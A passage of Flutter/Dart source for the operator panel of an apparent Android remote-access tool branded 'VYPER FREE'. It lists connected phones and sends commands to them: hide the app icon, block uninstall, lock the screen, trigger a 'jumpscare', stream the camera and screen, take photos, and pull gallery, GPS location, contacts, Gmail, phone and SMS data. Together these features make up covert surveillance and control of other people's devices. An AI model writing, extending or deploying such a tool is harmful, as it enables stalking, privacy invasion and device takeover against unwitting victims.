                              decoration: const BoxDecoration(
                                color: Color(0xFF00e5a0),
                                shape: BoxShape.circle,
                                boxShadow: [
                                  BoxShadow(
                                    color: Color(0xFF00e5a0),
                                    blurRadius: 8,
                                  ),
                                ],
                              ),
                            ),
                            const SizedBox(width: 6),
                            Text(
                              'CONNECT',
                              style: TextStyle(
                                fontSize: 8,
                                color: const Color(0xFF00e5a0),
                                fontFamily: 'IBM Plex Mono',
                                letterSpacing: 2,
                              ),
                            ),
                          ],
                        ),
                      ),
                    ],
                  ),
                ),
              ],
            ),
          ),

          // User Card
          Container(
            margin: const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
            padding: const EdgeInsets.all(16),
            decoration: BoxDecoration(
              borderRadius: BorderRadius.circular(20),
              border: Border.all(color: const Color(0xFF4f8dff).withOpacity(0.1)),
              color: const Color(0xFF0d1e38).withOpacity(0.85),
              boxShadow: [
                BoxShadow(
                  color: Colors.black.withOpacity(0.6),
                  blurRadius: 24,
                ),
              ],
            ),
            child: Column(
              children: [
                Row(
                  children: [
                    Container(
                      width: 56,
                      height: 56,
                      decoration: BoxDecoration(
                        borderRadius: BorderRadius.circular(14),
                        border: Border.all(color: const Color(0xFF4f8dff).withOpacity(0.2)),
                        color: const Color(0xFF0d1e38),
                        boxShadow: [
                          BoxShadow(
                            color: const Color(0xFF4f8dff).withOpacity(0.15),
                            blurRadius: 20,
                          ),
                        ],
                      ),
                      child: const Icon(
                        Icons.person,
                        color: Color(0xFF4d8fff),
                        size: 28,
                      ),
                    ),
                    const SizedBox(width: 14),
                    Expanded(
                      child: Column(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          Text(
                            widget.displayName.toUpperCase(),
                            style: TextStyle(
                              fontFamily: 'Rajdhani',
                              fontSize: 20,
                              fontWeight: FontWeight.w700,
                              color: Colors.white,
                              letterSpacing: 2,
                              shadows: [
                                Shadow(
                                  blurRadius: 30,
                                  color: const Color(0xFF4f8dff).withOpacity(0.4),
                                ),
                              ],
                            ),
                          ),
                          const SizedBox(height: 4),
                          Container(
                            padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 2),
                            decoration: BoxDecoration(
                              borderRadius: BorderRadius.circular(4),
                              border: Border.all(color: const Color(0xFF4f8dff).withOpacity(0.15)),
                              color: const Color(0xFF4f8dff).withOpacity(0.06),
                            ),
                            child: Row(
                              mainAxisSize: MainAxisSize.min,
                              children: [
                                Container(
                                  width: 4,
                                  height: 4,
                                  decoration: const BoxDecoration(
                                    color: Color(0xFF4d8fff),
                                    shape: BoxShape.circle,
                                  ),
                                ),
                                const SizedBox(width: 4),
                                Text(
                                  _role.toUpperCase(),
                                  style: TextStyle(
                                    fontSize: 8,
                                    color: const Color(0xFF4d8fff),
                                    fontFamily: 'IBM Plex Mono',
                                    letterSpacing: 2,
                                  ),
                                ),
                              ],
                            ),
                          ),
                          if (_trialExpiry != null)
                            Container(
                              margin: const EdgeInsets.only(top: 6),
                              padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 2),
                              decoration: BoxDecoration(
                                borderRadius: BorderRadius.circular(4),
                                border: Border.all(color: const Color(0xFFFF4D6D).withOpacity(0.2)),
                                color: const Color(0xFFFF4D6D).withOpacity(0.06),
                              ),
                              child: Row(
                                mainAxisSize: MainAxisSize.min,
                                children: [
                                  const Icon(
                                    Icons.timer_outlined,
                                    color: Color(0xFFFF4D6D),
                                    size: 10,
                                  ),
                                  const SizedBox(width: 4),
                                  Text(
                                    'TRIAL · ${_getTrialRemaining()}',
                                    style: TextStyle(
                                      fontSize: 8,
                                      color: const Color(0xFFFF4D6D),
                                      fontFamily: 'IBM Plex Mono',
                                      letterSpacing: 1.5,
                                    ),
                                  ),
                                ],
                              ),
                            ),
                        ],
                      ),
                    ),
                  ],
                ),
                const SizedBox(height: 12),
                Container(
                  padding: const EdgeInsets.symmetric(vertical: 8),
                  decoration: BoxDecoration(
                    borderRadius: BorderRadius.circular(10),
                    border: Border.all(color: const Color(0xFF4f8dff).withOpacity(0.1)),
                  ),
                  child: Row(
                    mainAxisAlignment: MainAxisAlignment.spaceAround,
                    children: [
                      _buildStatItem('DEVICES', _devices.length.toString()),
                      _buildStatItem('VER', '3.0'),
                      _buildStatItem('ROLE', _role.toUpperCase()),
                    ],
                  ),
                ),
              ],
            ),
          ),

          // Quick Actions
          Container(
            margin: const EdgeInsets.symmetric(horizontal: 16),
            child: Column(
              children: [
                Row(
                  children: [
                    Text(
                      'Quick Actions',
                      style: TextStyle(
                        fontSize: 10,
                        fontWeight: FontWeight.w700,
                        color: Colors.white.withOpacity(0.3),
                        letterSpacing: 2,
                        fontFamily: 'Syne',
                      ),
                    ),
                    const SizedBox(width: 8),
                    Container(
                      padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 2),
                      decoration: BoxDecoration(
                        borderRadius: BorderRadius.circular(4),
                        border: Border.all(color: const Color(0xFF00e5a0).withOpacity(0.15)),
                        color: const Color(0xFF00e5a0).withOpacity(0.05),
                      ),
                      child: Row(
                        children: [
                          Container(
                            width: 4,
                            height: 4,
                            decoration: const BoxDecoration(
                              color: Color(0xFF00e5a0),
                              shape: BoxShape.circle,
                              boxShadow: [
                                BoxShadow(color: Color(0xFF00e5a0), blurRadius: 6),
                              ],
                            ),
                          ),
                          const SizedBox(width: 4),
                          Text(
                            'LIVE',
                            style: TextStyle(
                              fontSize: 7,
                              color: const Color(0xFF00e5a0),
                              fontFamily: 'IBM Plex Mono',
                              letterSpacing: 1.5,
                              fontWeight: FontWeight.w700,
                            ),
                          ),
                        ],
                      ),
                    ),
                  ],
                ),
                const SizedBox(height: 10),
                SingleChildScrollView(
                  scrollDirection: Axis.horizontal,
                  child: Row(
                    children: [
                      _buildQuickActionCard(
                        icon: Icons.movie_outlined,
                        title: 'Nonton Anime',
                        subtitle: 'Streaming subtitle indo',
                        onTap: () {},
                      ),
                      const SizedBox(width: 10),
                      _buildQuickActionCard(
                        icon: Icons.stars_outlined,
                        title: 'Coming Soon',
                        subtitle: 'Fitur menarik lainnya',
                        onTap: () {},
                        isComingSoon: true,
                      ),
                    ],
                  ),
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildStatItem(String label, String value) {
    return Column(
      children: [
        Text(
          value,
          style: TextStyle(
            fontSize: 18,
            fontWeight: FontWeight.w700,
            color: const Color(0xFF4d8fff),
            fontFamily: 'Rajdhani',
            shadows: [
              Shadow(
                blurRadius: 12,
                color: const Color(0xFF4f8dff).withOpacity(0.4),
              ),
            ],
          ),
        ),
        Text(
          label,
          style: TextStyle(
            fontSize: 7,
            color: const Color(0xFF1a3050),
            fontFamily: 'IBM Plex Mono',
            letterSpacing: 2,
          ),
        ),
      ],
    );
  }

  Widget _buildQuickActionCard({
    required IconData icon,
    required String title,
    required String subtitle,
    required VoidCallback onTap,
    bool isComingSoon = false,
  }) {
    return GestureDetector(
      onTap: onTap,
      child: Container(
        width: 280,
        padding: const EdgeInsets.all(14),
        decoration: BoxDecoration(
          borderRadius: BorderRadius.circular(16),
          border: Border.all(
            color: isComingSoon
                ? Colors.white.withOpacity(0.04)
                : const Color(0xFF4f8dff).withOpacity(0.1),
          ),
          color: isComingSoon
              ? Colors.white.withOpacity(0.02)
              : const Color(0xFF4f8dff).withOpacity(0.025),
        ),
        child: Row(
          children: [
            Container(
              width: 44,
              height: 44,
              decoration: BoxDecoration(
                borderRadius: BorderRadius.circular(12),
                color: isComingSoon
                    ? const Color(0xFF00e5a0).withOpacity(0.04)
                    : const Color(0xFF4f8dff).withOpacity(0.08),
                border: Border.all(
                  color: isComingSoon
                      ? const Color(0xFF00e5a0).withOpacity(0.1)
                      : const Color(0xFF4f8dff).withOpacity(0.15),
                ),
              ),
              child: Icon(
                icon,
                color: isComingSoon ? const Color(0xFF00e5a0) : const Color(0xFF4d8fff),
                size: 20,
              ),
            ),
            const SizedBox(width: 12),
            Expanded(
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Text(
                    title,
                    style: TextStyle(
                      fontSize: 14,
                      fontWeight: FontWeight.w700,
                      color: isComingSoon ? Colors.white.withOpacity(0.4) : Colors.white,
                      letterSpacing: 0.5,
                    ),
                  ),
                  Text(
                    subtitle,
                    style: TextStyle(
                      fontSize: 9,
                      color: isComingSoon
                          ? Colors.white.withOpacity(0.2)
                          : Colors.white.withOpacity(0.35),
                    ),
                  ),
                ],
              ),
            ),
            Icon(
              Icons.arrow_forward_ios,
              color: isComingSoon
                  ? Colors.white.withOpacity(0.1)
                  : Colors.white.withOpacity(0.15),
              size: 14,
            ),
          ],
        ),
      ),
    );
  }

  // ==================== DEVICES PAGE ====================
  Widget _buildDevicesPage() {
    return Column(
      children: [
        Padding(
          padding: const EdgeInsets.all(16),
          child: Row(
            children: [
              Text(
                'DEVICES',
                style: TextStyle(
                  fontSize: 11,
                  fontWeight: FontWeight.w600,
                  color: const Color(0xFF4a6a9a),
                  fontFamily: 'Rajdhani',
                  letterSpacing: 3,
                ),
              ),
              const Expanded(
                child: Divider(
                  color: Color(0xFF4f8dff),
                  thickness: 1,
                ),
              ),
            ],
          ),
        ),
        Expanded(
          child: _isLoading
              ? const Center(
                  child: CircularProgressIndicator(
                    strokeWidth: 2,
                    color: Color(0xFF4f8dff),
                  ),
                )
              : _devices.isEmpty
                  ? _buildEmptyState()
                  : ListView.builder(
                      padding: const EdgeInsets.symmetric(horizontal: 16),
                      itemCount: _devices.length,
                      itemBuilder: (context, index) {
                        final device = _devices[index];
                        final isSelected = device['id'] == _selectedDeviceId;
                        final battery = device['info']?['battery'] ?? -1;
                        final isCharging = device['info']?['charging'] ?? false;
                        final androidVersion = device['info']?['androidVersion'] ?? '?';
                        final sdkVersion = device['info']?['sdkVersion'] ?? '?';

                        return GestureDetector(
                          onTap: () {
                            setState(() {
                              _selectedDeviceId = device['id'];
                              _fetchDeviceStatus(device['id']);
                            });
                            _showToast('Device Dipilih', 'Buka tab Kontrol', isError: false);
                          },
                          child: Container(
                            margin: const EdgeInsets.only(bottom: 8),
                            padding: const EdgeInsets.all(12),
                            decoration: BoxDecoration(
                              borderRadius: BorderRadius.circular(14),
                              border: Border.all(
                                color: isSelected
                                    ? const Color(0xFF4f8dff).withOpacity(0.3)
                                    : const Color(0xFF4f8dff).withOpacity(0.06),
                              ),
                              color: isSelected
                                  ? const Color(0xFF4f8dff).withOpacity(0.08)
                                  : const Color(0xFF081428).withOpacity(0.9),
                            ),
                            child: Row(
                              children: [
                                Container(
                                  width: 40,
                                  height: 56,
                                  decoration: BoxDecoration(
                                    borderRadius: BorderRadius.circular(6),
                                    border: Border.all(
                                      color: isSelected
                                          ? const Color(0xFF4d8fff)
                                          : const Color(0xFF1a3050),
                                    ),
                                  ),
                                  child: Stack(
                                    children: [
                                      Container(
                                        margin: const EdgeInsets.all(4),
                                        decoration: BoxDecoration(
                                          borderRadius: BorderRadius.circular(2),
                                          border: Border.all(
                                            color: const Color(0xFF4f8dff).withOpacity(0.1),
                                          ),
                                        ),
                                      ),
                                      Positioned(
                                        top: 4,
                                        left: 0,
                                        right: 0,
                                        child: Container(
                                          height: 1.5,
                                          margin: const EdgeInsets.symmetric(horizontal: 6),
                                          color: const Color(0xFF1a3050),
                                        ),
                                      ),
                                      Positioned(
                                        bottom: 4,
                                        left: 0,
                                        right: 0,
                                        child: Container(
                                          height: 6,
                                          margin: const EdgeInsets.symmetric(horizontal: 6),
                                          decoration: BoxDecoration(
                                            color: isSelected
                                                ? const Color(0xFF4d8fff).withOpacity(0.3)
                                                : const Color(0xFF1a3050),
                                            shape: BoxShape.circle,
                                          ),
                                        ),
                                      ),
                                      Positioned(
                                        top: 8,
                                        left: 4,
                                        right: 4,
                                        bottom: 14,
                                        child: Container(
                                          decoration: BoxDecoration(
                                            borderRadius: BorderRadius.circular(2),
                                            gradient: isSelected
                                                ? LinearGradient(
                                                    colors: [
                                                      const Color(0xFF4f8dff).withOpacity(0.3),
                                                      const Color(0xFF00d4ff).withOpacity(0.2),
                                                    ],
                                                  )
                                                : null,
                                            border: Border.all(
                                              color: const Color(0xFF4f8dff).withOpacity(0.1),
                                            ),
                                          ),
                                        ),
                                      ),
                                    ],
                                  ),
                                ),
                                const SizedBox(width: 10),
                                if (battery >= 0)
                                  Column(
                                    children: [
                                      Container(
                                        width: 20,
                                        height: 10,
                                        decoration: BoxDecoration(
                                          borderRadius: BorderRadius.circular(2),
                                          border: Border.all(color: const Color(0xFF1a3050)),
                                        ),
                                        child: Row(
                                          children: [
                            Expanded(
                              flex: battery,
                              child: Container(
                                decoration: BoxDecoration(
                                  color: battery <= 20
                                      ? const Color(0xFFFF4D6D)
                                      : battery <= 40
                                          ? const Color(0xFFFFC34D)
                                          : const Color(0xFF00e5a0),
                                  borderRadius: BorderRadius.circular(1),
                                ),
                              ),
                            ),
                            const SizedBox(width: 2),
                            Container(
                              width: 2,
                              height: 4,
                              color: const Color(0xFF1a3050),
                            ),
                          ],
                        ),
                      ),
                      const SizedBox(height: 2),
                      Text(
                        '$battery%${isCharging ? '⚡' : ''}',
                        style: const TextStyle(
                          fontSize: 7,
                          color: Color(0xFF8ab4e0),
                        ),
                      ),
                    ],
                  ),
                  const SizedBox(width: 10),
                  Expanded(
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        Text(
                          device['name'] ?? 'Unknown',
                          style: TextStyle(
                            fontSize: 14,
                            fontWeight: FontWeight.w600,
                            color: isSelected ? Colors.white : const Color(0xFF8ab4e0),
                            letterSpacing: 0.5,
                          ),
                        ),
                        Text(
                          device['id'] ?? '',
                          style: const TextStyle(
                            fontSize: 9,
                            color: Color(0xFF1a3050),
                            fontFamily: 'IBM Plex Mono',
                          ),
                          maxLines: 1,
                          overflow: TextOverflow.ellipsis,
                        ),
                        if (battery >= 0)
                          Text(
                            'Android $androidVersion · SDK $sdkVersion',
                            style: const TextStyle(
                              fontSize: 8,
                              color: Color(0xFF1a3050),
                              fontFamily: 'IBM Plex Mono',
                            ),
                          ),
                      ],
                    ),
                  ),
                  Column(
                    crossAxisAlignment: CrossAxisAlignment.end,
                    children: [
                      Container(
                        width: 6,
                        height: 6,
                        decoration: const BoxDecoration(
                          color: Color(0xFF00e5a0),
                          shape: BoxShape.circle,
                          boxShadow: [
                            BoxShadow(
                              color: Color(0xFF00e5a0),
                              blurRadius: 8,
                            ),
                          ],
                        ),
                      ),
                      const SizedBox(height: 4),
                      Text(
                        '${(index + 1).toString().padLeft(2, '0')}',
                        style: const TextStyle(
                          fontSize: 9,
                          color: Color(0xFF1a3050),
                          fontFamily: 'IBM Plex Mono',
                        ),
                      ),
                      if (isSelected)
                        Container(
                          width: 16,
                          height: 16,
                          decoration: BoxDecoration(
                            borderRadius: BorderRadius.circular(4),
                            gradient: const LinearGradient(
                              colors: [Color(0xFF1d6fff), Color(0xFF00d4ff)],
                            ),
                          ),
                          child: const Icon(
                            Icons.check,
                            color: Colors.white,
                            size: 12,
                          ),
                        ),
                    ],
                  ),
                ],
              ),
            ),
          ),
        );
      },
    ),
    );
  }

  Widget _buildEmptyState() {
    return Center(
      child: Column(
        mainAxisAlignment: MainAxisAlignment.center,
        children: [
          Icon(
            Icons.phone_android_outlined,
            size: 60,
            color: const Color(0xFF1a3050),
          ),
          const SizedBox(height: 16),
          Text(
            'No Devices',
            style: TextStyle(
              fontSize: 16,
              fontWeight: FontWeight.w600,
              color: const Color(0xFF4a6a9a),
              fontFamily: 'Rajdhani',
              letterSpacing: 1,
            ),
          ),
          const SizedBox(height: 4),
          Text(
            'Belum ada device...',
            style: TextStyle(
              fontSize: 9,
              color: const Color(0xFF1a3050),
              fontFamily: 'IBM Plex Mono',
              letterSpacing: 2,
            ),
          ),
        ],
      ),
    );
  }

  // ==================== CONTROL PAGE ====================
  Widget _buildControlPage() {
    if (_selectedDeviceId.isEmpty) {
      return Center(
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Icon(
              Icons.phone_android_outlined,
              size: 60,
              color: const Color(0xFF1a3050),
            ),
            const SizedBox(height: 16),
            Text(
              'No Device Selected',
              style: TextStyle(
                fontSize: 16,
                fontWeight: FontWeight.w600,
                color: const Color(0xFF4a6a9a),
                fontFamily: 'Rajdhani',
                letterSpacing: 1,
              ),
            ),
            const SizedBox(height: 4),
            Text(
              'Choose a device in the Devices tab',
              style: TextStyle(
                fontSize: 9,
                color: const Color(0xFF1a3050),
                fontFamily: 'IBM Plex Mono',
                letterSpacing: 2,
              ),
            ),
          ],
        ),
      );
    }

    final device = _devices.firstWhere(
      (d) => d['id'] == _selectedDeviceId,
      orElse: () => {},
    );

    return SingleChildScrollView(
      padding: const EdgeInsets.only(bottom: 80),
      child: Column(
        children: [
          // Device Header
          Container(
            margin: const EdgeInsets.all(12),
            decoration: BoxDecoration(
              borderRadius: BorderRadius.circular(16),
              border: Border.all(
                color: const Color(0xFF4f8dff).withOpacity(0.2),
              ),
            ),
            child: ClipRRect(
              borderRadius: BorderRadius.circular(16),
              child: Column(
                children: [
                  Container(
                    height: 120,
                    decoration: const BoxDecoration(
                      image: DecorationImage(
                        image: AssetImage('assets/images/device_banner.gif'),
                        fit: BoxFit.cover,
                      ),
                    ),
                    child: Stack(
                      children: [
                        Container(
                          decoration: BoxDecoration(
                            gradient: LinearGradient(
                              begin: Alignment.topCenter,
                              end: Alignment.bottomCenter,
                              colors: [
                                Colors.transparent,
                                const Color(0xFF020510).withOpacity(0.85),
                              ],
                            ),
                          ),
                        ),
                        Positioned(
                          bottom: 12,
                          left: 12,
                          right: 12,
                          child: Row(
                            mainAxisAlignment: MainAxisAlignment.spaceBetween,
                            children: [
                              Container(
                                padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
                                decoration: BoxDecoration(
                                  borderRadius: BorderRadius.circular(6),
                                  border: Border.all(
                                    color: const Color(0xFF00e5a0).withOpacity(0.25),
                                  ),
                                  color: const Color(0xFF00e5a0).withOpacity(0.06),
                                ),
                                child: Row(
                                  children: [
                                    Container(
                                      width: 4,
                                      height: 4,
                                      decoration: const BoxDecoration(
                                        color: Color(0xFF00e5a0),
                                        shape: BoxShape.circle,
                                        boxShadow: [
                                          BoxShadow(
                                            color: Color(0xFF00e5a0),
                                            blurRadius: 6,
                                          ),
                                        ],
                                      ),
                                    ),
                                    const SizedBox(width: 4),
                                    Text(
                                      'ONLINE',
                                      style: TextStyle(
                                        fontSize: 8,
                                        color: const Color(0xFF00e5a0),
                                        fontFamily: 'IBM Plex Mono',
                                        letterSpacing: 2,
                                      ),
                                    ),
                                  ],
                                ),
                              ),
                              Column(
                                crossAxisAlignment: CrossAxisAlignment.end,
                                children: [
                                  Text(
                                    device['name'] ?? 'Unknown',
                                    style: TextStyle(
                                      fontSize: 16,
                                      fontWeight: FontWeight.w700,
                                      color: Colors.white,
                                      letterSpacing: 2,
                                      fontFamily: 'Rajdhani',
                                      shadows: [
                                        Shadow(blurRadius: 20, color: Colors.black87),
                                      ],
                                    ),
                                  ),
                                  Text(
                                    device['id'] ?? '',
                                    style: TextStyle(
                                      fontSize: 8,
                                      color: Colors.white.withOpacity(0.3),
                                      fontFamily: 'IBM Plex Mono',
                                      letterSpacing: 1,
                                    ),
                                  ),
                                ],
                              ),
                            ],
                          ),
                        ),
                      ],
                    ),
                  ),
                  // Info Bar
                  Container(
                    padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
                    color: const Color(0xFF081428),
                    child: Row(
                      mainAxisAlignment: MainAxisAlignment.spaceBetween,
                      children: [
                        Row(
                          children: [
                            Container(
                              padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
                              decoration: BoxDecoration(
                                borderRadius: BorderRadius.circular(4),
                                color: _antiUninstall
                                    ? const Color(0xFFFF4D6D).withOpacity(0.08)
                                    : null,
                                border: Border.all(
                                  color: _antiUninstall
                                      ? const Color(0xFFFF4D6D).withOpacity(0.2)
                                      : const Color(0xFF4f8dff).withOpacity(0.1),
                                ),
                              ),
                              child: Row(
                                children: [
                                  Icon(
                                    Icons.security_outlined,
                                    color: _antiUninstall
                                        ? const Color(0xFFFF4D6D)
                                        : const Color(0xFF4a6a9a),
                                    size: 14,
                                  ),
                                  const SizedBox(width: 4),
                                  Text(
                                    _antiUninstall ? 'Anti Uninstall ON' : 'Anti Uninstall OFF',
                                    style: TextStyle(
                                      fontSize: 8,
                                      color: _antiUninstall
                                          ? const Color(0xFFFF4D6D)
                                          : const Color(0xFF4a6a9a),
                                      fontFamily: 'IBM Plex Mono',
                                      letterSpacing: 1,
                                    ),
                                  ),
                                ],
                              ),
                            ),
                            const SizedBox(width: 8),
                            Switch(
                              value: _antiUninstall,
                              onChanged: (value) {
                                setState(() => _antiUninstall = value);
                                _sendCommand(_selectedDeviceId, 'antiUninstall', value);
                              },
                              activeColor: const Color(0xFFFF4D6D),
                            ),
                          ],
                        ),
                        IconButton(
                          onPressed: () {
                            setState(() {
                              _currentPage = 1; // Devices tab
                            });
                          },
                          icon: Icon(
                            Icons.swap_horiz,
                            color: const Color(0xFF4d8fff),
                            size: 16,
                          ),
                          padding: EdgeInsets.zero,
                          constraints: const BoxConstraints(),
                        ),
                      ],
                    ),
                  ),
                ],
              ),
            ),
          ),

          // Control Grid
          Padding(
            padding: const EdgeInsets.symmetric(horizontal: 12),
            child: Column(
              children: [
                _buildControlSection('Kontrol Device'),
                const SizedBox(height: 8),
                GridView.count(
                  crossAxisCount: 2,
                  crossAxisSpacing: 8,
                  mainAxisSpacing: 8,
                  shrinkWrap: true,
                  physics: const NeverScrollableScrollPhysics(),
                  childAspectRatio: 1.2,
                  children: [
                    _buildControlTile(
                      icon: Icons.flash_on,
                      title: 'Flashlight',
                      isActive: _flashlight,
                      onTap: _toggleFlashlight,
                      color: const Color(0xFF1d6fff),
                    ),
                    _buildControlTile(
                      icon: Icons.lock,
                      title: 'Lock low',
                      isActive: _deviceLocked,
                      onTap: _toggleLock,
                      color: const Color(0xFFa78bfa),
                    ),
                    _buildControlTile(
                      icon: Icons.lock_outline,
                      title: 'Lock Custom V2',
                      isActive: _lockCustomActive,
                      onTap: _toggleCustomLock,
                      color: const Color(0xFFa78bfa),
                    ),
                    _buildControlTile(
                      icon: Icons.visibility_off,
                      title: 'Hide Icon',
                      isActive: _iconHidden,
                      onTap: () {
                        setState(() => _iconHidden = !_iconHidden);
                        _sendCommand(_selectedDeviceId, 'hideIcon', _iconHidden);
                      },
                      color: const Color(0xFFfb923c),
                    ),
                    _buildControlTile(
                      icon: Icons.volume_up,
                      title: 'Mute Volume',
                      isActive: _volumeMuted,
                      onTap: () {
                        setState(() => _volumeMuted = !_volumeMuted);
                        _sendCommand(_selectedDeviceId, 'muteVolume', _volumeMuted);
                      },
                      color: const Color(0xFF22c55e),
                    ),
                    _buildControlTile(
                      icon: Icons.warning_amber,
                      title: 'Jumpscare',
                      isActive: _jumpscareActive,
                      onTap: _toggleJumpscare,
                      color: const Color(0xFFFF4D6D),
                    ),
                    _buildControlTile(
                      icon: Icons.videocam,
                      title: 'Live Camera',
                      isActive: _cameraActive,
                      onTap: () {
                        setState(() => _cameraActive = !_cameraActive);
                        _sendCommand(_selectedDeviceId, 'camera', _cameraActive ? 'back' : 'off');
                      },
                      color: const Color(0xFFFF4D6D),
                    ),
                    _buildControlTile(
                      icon: Icons.screen_share,
                      title: 'Live Screen',
                      isActive: _screenActive,
                      onTap: () {
                        setState(() => _screenActive = !_screenActive);
                        _sendCommand(_selectedDeviceId, 'screen', _screenActive ? 'start' : 'stop');
                      },
                      color: const Color(0xFF00d4ff),
                    ),
                    _buildControlTile(
                      icon: Icons.photo_library,
                      title: 'Galeri',
                      isActive: false,
                      onTap: _showGalleryDialog,
                      color: const Color(0xFF4d8fff),
                    ),
                    _buildControlTile(
                      icon: Icons.location_on,
                      title: 'GPS Lokasi',
                      isActive: false,
                      onTap: _showLocationDialog,
                      color: const Color(0xFF00e5a0),
                    ),
                    _buildControlTile(
                      icon: Icons.contacts,
                      title: 'Kontak',
                      isActive: false,
                      onTap: _showContactsDialog,
                      color: const Color(0xFFFFC34D),
                    ),
                    _buildControlTile(
                      icon: Icons.email,
                      title: 'Gmail',
                      isActive: false,
                      onTap: _showGmailDialog,
                      color: const Color(0xFFf87171),
                    ),
                    _buildControlTile(
                      icon: Icons.phone,
                      title: 'Phone',
                      isActive: false,
                      onTap: _showPhoneDialog,
                      color: const Color(0xFF34d399),
                    ),
                    _buildControlTile(
                      icon: Icons.videocam,
                      title: 'Take Camera',
                      isActive: false,
                      onTap: () {
                        _sendCommand(_selectedDeviceId, 'camera', 'back');
                        _showToast('Camera', 'Mengambil foto...', isError: false);
                      },
                      color: const Color(0xFFFF4D6D),
                    ),
                  ],
                ),
                const SizedBox(height: 16),
                _buildControlSection('Streaming'),
                const SizedBox(height: 8),
                _buildControlTile(
                  icon: Icons.videocam,
                  title: 'Live Camera',
                  isActive: _cameraActive,
                  onTap: () {
                    setState(() => _cameraActive = !_cameraActive);
                    _sendCommand(_selectedDeviceId, 'camera', _cameraActive ? 'back' : 'off');
                  },
                  color: const Color(0xFFFF4D6D),
                  width: double.infinity,
                ),
                _buildControlTile(
                  icon: Icons.screen_share,
                  title: 'Live Screen',
                  isActive: _screenActive,
                  onTap: () {
                    setState(() => _screenActive = !_screenActive);
                    _sendCommand(_selectedDeviceId, 'screen', _screenActive ? 'start' : 'stop');
                  },
                  color: const Color(0xFF00d4ff),
                  width: double.infinity,
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildControlSection(String title) {
    return Row(
      children: [
        Text(
          title,
          style: TextStyle(
            fontSize: 10,
            fontWeight: FontWeight.w600,
            color: const Color(0xFF1a3050),
            fontFamily: 'IBM Plex Mono',
            letterSpacing: 3,
          ),
        ),
        const Expanded(
          child: Divider(
            color: Color(0xFF4f8dff),
            thickness: 0.5,
          ),
        ),
      ],
    );
  }

  Widget _buildControlTile({
    required IconData icon,
    required String title,
    required bool isActive,
    required VoidCallback onTap,
    required Color color,
    double width = 0,
  }) {
    return GestureDetector(
      onTap: onTap,
      child: Container(
        width: width,
        padding: const EdgeInsets.all(12),
        decoration: BoxDecoration(
          borderRadius: BorderRadius.circular(14),
          border: Border.all(
            color: isActive ? color.withOpacity(0.3) : const Color(0xFF4f8dff).withOpacity(0.06),
          ),
          color: isActive
              ? color.withOpacity(0.08)
              : const Color(0xFF081428).withOpacity(0.9),
        ),
        child: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            Row(
              mainAxisAlignment: MainAxisAlignment.spaceBetween,
              children: [
                Container(
                  padding: const EdgeInsets.all(6),
                  decoration: BoxDecoration(
                    borderRadius: BorderRadius.circular(8),
                    color: color.withOpacity(0.08),
                    border: Border.all(color: color.withOpacity(0.08)),
                  ),
                  child: Icon(
                    icon,
                    color: isActive ? color : const Color(0xFF4a6a9a),
                    size: 16,
                  ),
                ),
                Switch(
                  value: isActive,
                  onChanged: (_) => onTap(),
                  activeColor: color,
                  materialTapTargetSize: MaterialTapTargetSize.shrinkWrap,
                ),
              ],
            ),
            const SizedBox(height: 4),
            Text(
              title,
              style: TextStyle(
                fontSize: 12,
                fontWeight: FontWeight.w600,
                color: isActive ? Colors.white : const Color(0xFF8ab4e0),
                letterSpacing: 0.5,
              ),
            ),
            Text(
              isActive ? '● ACTIVE' : '○ OFF',
              style: TextStyle(
                fontSize: 8,
                color: isActive ? color : const Color(0xFF1a3050),
                fontFamily: 'IBM Plex Mono',
                letterSpacing: 1,
              ),
            ),
          ],
        ),
      ),
    );
  }

  // ==================== SMS PAGE ====================
  Widget _buildSmsPage() {
    return Column(
      children: [
        Padding(
          padding: const EdgeInsets.all(16),
          child: Row(
            children: [
              Text(
                'PESAN & NOTIFIKASI',
                style: TextStyle(
                  fontSize: 11,
                  fontWeight: FontWeight.w600,
                  color: const Color(0xFF4a6a9a),
                  fontFamily: 'Rajdhani',
                  letterSpacing: 3,
                ),
              ),
              const Expanded(
                child: Divider(
                  color: Color(0xFF4f8dff),
                  thickness: 1,
                ),
              ),
            ],
          ),
        ),
        Expanded(
          child: Center(
            child: Column(
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
                Icon(
                  Icons.message_outlined,
                  size: 60,
                  color: const Color(0xFF1a3050),
                ),
                const SizedBox(height: 16),
                Text(
                  'Pilih device untuk melihat pesan',
                  style: TextStyle(
                    fontSize: 14,
                    color: const Color(0xFF4a6a9a),
                    fontFamily: 'Rajdhani',
                    letterSpacing: 1,
                  ),
                ),
                const SizedBox(height: 8),
                OutlinedButton(
                  onPressed: () {
                    setState(() => _currentPage = 1);
                  },
                  style: OutlinedButton.styleFrom(
                    side: BorderSide(color: const Color(0xFF4f8dff).withOpacity(0.3)),
                    shape: RoundedRectangleBorder(
                      borderRadius: BorderRadius.circular(10),
                    ),
                  ),
                  child: const Text(
                    'Pilih Device',
                    style: TextStyle(color: Color(0xFF4d8fff)),
                  ),
                ),
              ],
            ),
          ),
        ),
      ],
    );
  }

  // ==================== SIDEBAR ====================
  Widget _buildSidebar() {
    return Container(
      width: 280,
      height: double.infinity,
      color: const Color(0xFF020510),
      child: Column(
        children: [
          // Header
          Container(
            padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 20),
            decoration: BoxDecoration(
              border: Border(
                bottom: BorderSide(
                  color: const Color(0xFF4f8dff).withOpacity(0.08),
                ),
              ),
            ),
            child: Row(
              children: [
                Expanded(
                  child: RichText(
                    text: TextSpan(
                      style: const TextStyle(
                        fontFamily: 'Bungee',
                        fontSize: 16,
                        letterSpacing: 3,
                      ),
                      children: [
                        const TextSpan(text: 'VYPER', style: TextStyle(color: Colors.white)),
                        TextSpan(
                          text: 'FREE',
